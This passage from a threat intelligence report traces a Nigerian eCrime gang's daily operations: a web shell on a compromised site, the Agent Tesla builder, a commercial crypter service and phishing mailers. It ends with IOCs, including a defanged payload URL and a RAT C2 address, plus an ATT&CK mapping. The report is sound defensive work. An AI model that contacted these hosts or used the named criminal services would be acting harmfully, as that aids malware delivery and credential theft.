various malware builder kits, services, and inboxes for conducting their operations. After starting the day checking in with the apparent manager, E.K.P begins with their operational rounds by accessing their web shell on *predilletastore[.]com[.]br.* According to our research, the site is likely a compromised WordPress website hosting a web shell. E.K.P. uses this for attack operations and to control compromised hosts remotely. Further, the eCrime gang leverages it to store their attack tools such as payloads and files. [![E.K.P.'s web shell on predilletastore[.]com[.]br](data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw== ""Screenshot of E.K.P.'s web shell on predilletastore[.]com[.]br"")![E.K.P.'s web shell on predilletastore[.]com[.]br](https://quointelligence.eu/wp-content/uploads/2021/06/image5-1024x561.jpg ""Screenshot of E.K.P.'s web shell on predilletastore[.]com[.]br"")](https://quointelligence.eu/wp-content/uploads/2021/06/image5-1024x561.jpg ""E.K.P.'s web shell on predilletastore[.]com[.]br"") ##### Screenshot of predilletastore[.]com[.]br – E.K.P. web shell Based on their contact list, E.K.P seems to have access to a wide range of tools, especially if a potential customer requires capabilities outside the gang’s service catalog. However, during our observations, E.K.P heavily relied on mainly three core malware builder kits. ### Exploit Builder (version 1.5.0.1): A premium product requiring a license. Exploit Builder enables E.K.P to create an exploit document (e.g., Microsoft Word or Excel) that delivers a malware payload to a victim host. At first, the gang creates a payload using Origin Logger. Secondly, they obfuscate the payload with the Cassandra Crypter service. ### Origin Logger (also known as Agent Tesla): Through our analysis, we confirm that the payload generated by Origin Logger is nearly the same as previously decoded Agent Tesla payloads. The C2 panel interface matches the same panel that threat actors use for the malware Origin Logger, bundled with the C2 panel, and then sold to attackers. As the name suggests, its primary purpose is logging keystrokes, clipboard data, HTTP cookies, taking periodic screenshots, and viewing the webcam of infected computers. ![Screenshots showing Exploit Builder and Origin Logger](data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw== ""Screenshots showing Exploit Builder and Origin Logger"") ![Screenshots showing Exploit Builder and Origin Logger](https://quointelligence.eu/wp-content/uploads/2021/06/image6-1024x561.jpg ""Screenshots showing Exploit Builder and Origin Logger"") ##### Screenshots showing Exploit Builder and Origin Logger E.K.P leveraged the Origin Logger builder to create multiple variants to infect victims. For obfuscation of the payloads, the threat actor used the online service known as Cassandra Crypter. ### Cassandra Crypter Service: Based on their website, Cassandra Crypter Service describes itself as: > > *A cloud crypter which is coded by the coder of PoisonCrypter, it will be updated daily twice or even thrice (if needed). As a result, it will be giving you a FUD result and always fud for the premium users. It is working with both native and managed assemblies (running since 2018)* > > > The customized obfuscation (e.g., ConfuserEx) of the .NET Agent Tesla payloads offered through Cassandra Crypter is available through two subscription plans: The Premium or VIP Plan. The Premium Plan can be paid directly and works automatically, while the VIP Plan requires the subscriber to contact support first for personalization. [![Screenshot of Cassandra Crypter Service ](data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw== ""Screenshot of Cassandra Crypter Service "") ![Screenshot of Cassandra Crypter Service ](https://quointelligence.eu/wp-content/uploads/2021/06/image7-1024x815.jpg ""Screenshot of Cassandra Crypter Service "")](https://quointelligence.eu/wp-content/uploads/2021/06/image7-1024x815.jpg ""Screenshot of Cassandra Crypter Service "") [![Screenshot of Cassandra Crypter Service Plan & Pricing](data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw== ""Screenshot of Cassandra Crypter Service Plan & Pricing"") ![Screenshot of Cassandra Crypter Service Plan & Pricing](https://quointelligence.eu/wp-content/uploads/2021/06/image8.jpg ""Screenshot of Cassandra Crypter Service Plan & Pricing"")](https://quointelligence.eu/wp-content/uploads/2021/06/image8.jpg ""Screenshot of Cassandra Crypter Service Plan & Pricing"") ##### Screenshots of the Cassandra Crypter Dashboard and the service’s pricing plans While E.K.P expedites the time spent preparing malware variants and malicious documents for the attack campaigns using different tools, they eventually get to the distribution part. Consequently, they will check with their manager again for the target details. E.K.P communicates with multiple contacts throughout the day and even uses *Sendspace* – a free hosting site for instant file transfers – to receive and transfer documents for campaigns. [![Screenshots of Sendspace ](data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw== ""Screenshots of Sendspace "") ![Screenshots of Sendspace ](https://quointelligence.eu/wp-content/uploads/2021/06/image9.jpg ""Screenshots of Sendspace "")](https://quointelligence.eu/wp-content/uploads/2021/06/image9.jpg ""Screenshots of Sendspace "") [![Screenshots Turbomailer – both used by the Nigerian eCrime gang E.K.P.](data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw== ""Screenshots Turbomailer – used by the Nigerian eCrime gang E.K.P."")![Screenshots Turbomailer – both used by the Nigerian eCrime gang E.K.P.](https://quointelligence.eu/wp-content/uploads/2021/06/image10.jpg ""Screenshots Turbomailer – used by the Nigerian eCrime gang E.K.P."")](https://quointelligence.eu/wp-content/uploads/2021/06/image10.jpg ""Screenshots Turbomailer – both used by the Nigerian eCrime gang E.K.P. ##### Screenshots of Sendspace and Turbomailer – both used by the Nigerian eCrime gang E.K.P. Another tool that E.K.P frequently uses for mass emails is the *Xleet Phishing Service*, a service popular amongst threat actors to distribute spear-phishing emails throughout various attacks. One of the services offered by the marketplace where Xleet is sold, is access to a compromised server that hosts the PHP web shell that enables ongoing access to the server. QuoIntelligence recently analyzed campaigns attributed to [top-tier threat actor “Cobalt” group](https://quointelligence.eu/2020/07/golden-chickens-evolution-of-the-maas/), using a PHP-mailer script placed on a likely compromised server used to distribute spear-phishing emails. The Raise of eCrime Toolset Services ------------------------------------ This investigation is an example of the effectiveness of the cybercriminal underground offering competent toolset services. Through Malware-as-a-Service (MaaS) and other subscription models, less-skilled individuals can execute low-effort cybercrime. A similar, slightly more complex MaaS often used by APTs is the Golden Chickens (GC) MaaS. Since 2018, QuoIntelligence has tracked and highlighted the [evolution of the Golden Chickens (GC)](https://quointelligence.eu/2020/07/golden-chickens-evolution-of-the-maas/) MaaS and how different actors use it, including top-tier threat actors FIN6, Cobalt, and Evilnum. By 2019, we uncovered [eleven tools attributed to the GC MaaS](https://quointelligence.eu/2021/04/golden-chickens-compilation/)and each customized per campaign for the threat actor purchasing the service. In general, attributing attack activity to threat actors leveraging a MaaS is often complicated. The services offered can include both C2 infrastructure and malware variants. These are available to all MaaS customers, whether script kiddies or Advanced Persistent Threat (APT) actors. E.K.P.: A Highly Active MaaS Provider Supporting Multiple Campaigns Simultaneously ---------------------------------------------------------------------------------- Our investigation uncovered E.K.P’s day-to-day operation over a couple of months. It became clear that the threat actor is highly active, supporting multiple campaigns in parallel, and leveraging complete and straightforward toolsets to monetize activity. E-Crime is a large ecosystem consisting of interconnected services, schemes, and affiliate networking in the cybercriminal domain. Overall, their primary goal is financial gain. QuoIntelligence will continue to observe threat actors like E.K.P, which are operating non-complex but effective eCrime services. Apendix ------- **Malicious document (maldoc)** * 7007f35df3292a4ecd741839fc2dafde471538041e54cfc24207d9f49016dc77 **Maldoc name** * Azerbaijan-Turky Military Negotiation.doc **Maldoc C2** * https://cannabispropertybrokers[.]com/pop/8OwWKrFQ0gQoKt9[.]exe **AgentTesla (delivered by maldoc)** * cda07296d20a239bdb9cb5a2c9a814f69811bc85ced8bf32e998b906a413f416 **REMCOS RAT packed** * 15170d0dbe467efc4e38156ed4e03702ae19af44c100d7df7a75c6dbdb7ac587 **REMCOS RAT upacked** * 4d755262fd2c7f0539f919d300c7ebc3bd70267c002bcb8edd886a40e3f8ba75 **REMCOS RAT C2** * 79.134.225[.]72:64843 MITRE ATT&CK ------------ | **TACTIC** | **TECHNIQUE** | | **Initial Access** | [T1566.001: Phishing: Spearphishing Attachment](https://attack.mitre.org/techniques/T1566/001) | | **Execution** | [T1203: Exploitation for Client Execution](https://attack.mitre.org/techniques/T1203) [T1053.005: Scheduled Task/Job: Scheduled Task](https://attack.mitre.org/techniques/T1053/005) [T1047: Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) [T1204.002: User Execution: Malicious File](https://attack.mitre.org/techniques/T1204/002) | | **Persistance** | [T1547.001: Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder](https://attack.mitre.org/techniques/T1547/001) [T1053.005: Scheduled Task/Job: Scheduled Task](https://attack.mitre.org/techniques/T1053/005) | | **Privilege Escalation** | [T1547.001: Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder](https://attack.mitre.org/techniques/T1547/001) [T1055.012: Process Injection: Process Hollowing](https://attack.mitre.org/techniques/T1055/012/) [T1053.005: Scheduled Task/Job: Scheduled Task](https://attack.mitre.org/techniques/T1053/005) | | **Defense Evasion** | [T1140: Deobfuscate/Decode Files or Information](https://attack.mitre.org/techniques/T1140) [T1564.001: Hide Artifacts: Hidden Files and Directories](https://attack.mitre.org/techniques/T1564/001) [T1564.003: Hide Artifacts: Hidden Window](https://attack.mitre.org/techniques/T1564/003) [T1562.001: Impair Defenses: Disable or Modify Tools](https://attack.mitre.org/techniques/T1562/001) [T1112: Modify Registry](https://attack.mitre.org/techniques/T1112) [T1027: Obfuscated Files or Information](https://attack.mitre.org/techniques/T1027) [T1055.012: Process Injection: Process Hollowing](https://attack.mitre.org/techniques/T1055/012/) [T1218.009: Signed Binary Proxy Execution: Regsvcs/Regasm](https://attack.mitre.org/techniques/T1218/009) [T1497: Virtualization/Sandbox Evasion](https://attack.mitre.org/techniques/T1497) | | **Credential Access** | [T1555: Credentials from Password Stores](https://attack.mitre.org/techniques/T1555) [T1555.003: Credentials from Web Browsers](https://attack.mitre.org/techniques/T1555/003) [T1056.001: Input Capture: Keylogging](https://attack.mitre.org/techniques/T1056/001) [T1552.001: Unsecured Credentials: Credentials In Files](https://attack.mitre.org/techniques/T1552/001) [T1552.002: Unsecured Credentials: Credentials in Registry](https://attack.mitre.org/techniques/T1552/002) | | **Discovery** | [T1087.001: Account Discovery: Local Account](https://attack.mitre.org/techniques/T1087/001) [T1082: System Information Discovery](https://attack.mitre.org/techniques/T1082) [T1016: System Network Configuration Discovery](https://attack.mitre.org/techniques/T1016) [T1033: System Owner/User Discovery](https://attack.mitre.org/techniques/T1033) [T1124: System Time Discovery](https://attack.mitre.org/techniques/T1124) [T1057: Process Discovery](https://attack.mitre.org/techniques/T1057) [T1497: Virtualization/Sandbox Evasion](https://attack.mitre.org/techniques/T1497) | | **Collection** | [T1560: Archive Collected Data](https://attack.mitre.org/techniques/T1560) [T1115: Clipboard Data](https://attack.mitre.org/techniques/T1115) [T1056.001: Input Capture: Keylogging](https://attack.mitre.org/techniques/T1056/001) [T1185: Man in the Browser](https://attack.mitre.org/techniques/T1185) [T1113: Screen Capture](https://attack.mitre.org/techniques/T1113) [T1125: Video Capture](https://attack.mitre.org/techniques/T1125) | | **Command and Control (C2)** | [T1071.001: Application Layer Protocol: Web Protocols](https://attack.mitre.org/techniques/T1071/001) [T1071.003: Application Layer Protocol: Mail Protocols](https://attack.mitre.org/techniques/T1071/003) [T1105: Ingress Tool Transfer](https://attack.mitre.org/techniques/T1105) | | **Exfiltration** | [T1048.003: Exfiltration Over Alternative Protocol: Exfiltration Over Unencrypted/Obfuscated Non-C2 Protocol](https://attack.mitre.org/techniques/T1048/003) | [Get in touch!](https://quointelligence.eu/talk-to-an-expert/)"
